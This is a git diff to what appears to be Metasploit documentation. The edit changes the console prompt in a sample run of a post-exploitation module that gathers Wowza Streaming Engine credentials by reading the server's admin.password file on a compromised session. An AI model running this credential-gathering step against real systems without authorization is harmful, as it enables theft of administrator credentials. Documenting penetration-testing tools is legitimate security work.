@@ -25,10 +25,10 @@ Download and install [Wowza Streaming Engine](https://portal.wowza.com/account/d
 ### Wowza Streaming Engine Manager Version 4.8.20+1 (build 20220919162035) on Ubuntu 22.04
 
 ```
-msf6 > use post/multi/gather/wowza_streaming_engine_creds 
-msf6 post(multi/gather/wowza_streaming_engine_creds) > set session 1
+msf > use post/multi/gather/wowza_streaming_engine_creds 
+msf post(multi/gather/wowza_streaming_engine_creds) > set session 1
 session => 1
-msf6 post(multi/gather/wowza_streaming_engine_creds) > run
+msf post(multi/gather/wowza_streaming_engine_creds) > run
 
 [*] Parsing file /usr/local/WowzaStreamingEngine/conf/admin.password
 Wowza Streaming Engine Credentials
